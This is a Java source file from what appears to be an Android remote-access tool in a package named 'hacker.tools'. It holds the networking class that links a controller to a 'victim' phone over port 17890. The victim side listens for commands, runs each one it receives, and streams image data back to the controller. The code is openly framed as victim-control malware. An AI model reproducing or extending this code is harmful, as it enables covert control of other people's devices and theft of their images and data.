package com.androidremote.hacker.tools;

import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;


public class CreateConnection {
    public static Socket client=null;
    public static BufferedReader input;
    public static boolean imgThCanRead=false;
    public static ServerSocket server;
//    public static boolean isConnected=false;
    public static void listen() {
        new Thread( new Listen()).start();
    }


    public static void connect(String IP) {
        Log.e("KKKKKKKKKKKKKKK","Try to connect to "+IP);
        //boolean sortie=false;
        new Thread(
                () -> {
                    try {
                        client = new Socket(IP,17890);
                        Commandes.showToast(Remote.act,Remote.context,"Connected to victim");
                        Log.e("KKKKKKKKKKKKKKK","Connected to "+IP);
                        InfoConnection.isConnected=true;
                        InfoConnection.aError=false;
                    } catch (Exception e) {
                        e.printStackTrace();
                        InfoConnection.aError=true;
                        InfoConnection.isConnected=false;
                        Commandes.alerte(Remote.act,Remote.context, "Error","Connection error");
                        Log.e("KKKKKKKKKKKKKKK","Error "+e.getLocalizedMessage());
                    }

                }
        ).start();
        //return sortie;

    }


    static class Listen implements Runnable{

        @Override
        public void run() {
            try {
                server= new ServerSocket(17890);
                client = server.accept();
                //sendStrings("OK");
                new Thread(new Treatement()).start();
//                isConnected=true;
                Commandes.showToast(Remote.act,Remote.context,"Connected");
                Remote.act.finish();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    static class Treatement implements Runnable{

        @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
        @Override
        public void run() {
            while (!client.isClosed()){
            try {
                //sendStrings("ok");
                String action = readString();
                if(action!=null){
                    Remote.call(action);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            }
            Commandes.stopVictime(Remote.act, Remote.context);
        }
    }

    public static void sendStrings(String message){
        if(client != null){
            try {
//                output = new PrintWriter(client.getOutputStream());
                client.getOutputStream().write(message.getBytes());
                client.getOutputStream().write(10);
                //input = new BufferedReader(new InputStreamReader(client.getInputStream()));
                //output.print(message);
                //Log.e("KKKKKKKKKKKKKKK","sent - > "+message);
//                output.println(message);
            } catch (Exception e) {
                //Log.e("KKKKKKKKKKKKKKK",e.getMessage());
                e.printStackTrace();
//                isConnected=false;

            }

        }
    }

    public static void sendImage(int len, byte[] img){
        if(client != null){
            try {
                sendStrings("OK");
                readString();
                sendStrings(String.valueOf(len));
                readString();
                sendByte(img);
////                output = new PrintWriter(client.getOutputStream());
//                OutputStream tmp = client.getOutputStream();
////                tmp.write("OK".getBytes());
////                tmp.write(10);
//                tmp.write(message.getBytes());
//                tmp.write(10);
//                //input = new BufferedReader(new InputStreamReader(client.getInputStream()));
//                //output.print(message);
//                //Log.e("KKKKKKKKKKKKKKK","sent - > "+message);
//                output.println(message);
            } catch (Exception e) {
                //Log.e("KKKKKKKKKKKKKKK",e.getMessage());
                e.printStackTrace();
//                isConnected=false;

            }

        }
    }

    public static String readString(){
        String outi;
        try {
            //output = new PrintWriter(client.getOutputStream());
            //client.getOutputStream().write(message.getBytes());
            input = new BufferedReader(new InputStreamReader(client.getInputStream()));

            outi = input.readLine();
            Log.e("READ STRING THREAD","readed for readString : "+outi);
            return outi;
            //output.print(message);

        } catch (IOException e) {
            Log.e("READ STRING THREAD","error on read");
//            isConnected=false;
            return null;
        }
    }

    public static void readByte(int pos){
        try {
            //output = new PrintWriter(client.getOutputStream());
            //client.getOutputStream().write(message.getBytes());
            int n = client.getInputStream().read(Remote.imgSended, pos, Remote.imgSended.length-pos);
            Log.e("READ IMAGE THREAD","readed "+String.valueOf(n)+" Bytes of data of "+String.valueOf(Remote.imgSended.length));
            //output.print(message);
            pos+=n;

        } catch (Exception e) {
            Log.e("READ IMAGE THREAD","error on read");
//            isConnected=false;
            e.printStackTrace();
        }


        if (!(pos == Remote.imgSended.length)){
            readByte(pos);
        }
    }
    public static boolean sendByte(byte[] bytes){
        try {
            //output = new PrintWriter(client.getOutputStream());
            //client.getOutputStream().write(message.getBytes());
            OutputStream outputStream = client.getOutputStream();
//            outputStream.write("OK".getBytes());
            outputStream.write(bytes);
            Log.e("KKKKKKKKKKKKKKK","readed ");
            return true;
            //output.print(message);

        } catch (Exception e) {
            Log.e("SendBytes","error to Send bytes");
            return false;
        }
    }
    public static void sendCommand(String Command) {
        Log.e("KKKKKKKKKKKKKKK","Send "+Command);
        //boolean sortie=false;
        imgThCanRead=false;
        Commandes.alerteCommand(Remote.panel_act,Remote.panel_context,"Wait","Sending");
        new Thread(
                new Runnable() {
                    @Override
                    public void run() {
                        try {

                            sendStrings(Command);

                            while (!readString().equals("OK")){
                                //
                            }
                            Commandes.notalerteCommand(Remote.panel_act);
                            imgThCanRead=true;
                        }catch (Exception e){

                            Commandes.notalerteCommand(Remote.panel_act);
                            Commandes.alerte(Remote.panel_act,Remote.panel_context,"Error",
                                    "Error when sending data!");
                            imgThCanRead=true;
                            e.printStackTrace();
                        }


                    }
                }
        ).start();



        //return sortie;

    }
}
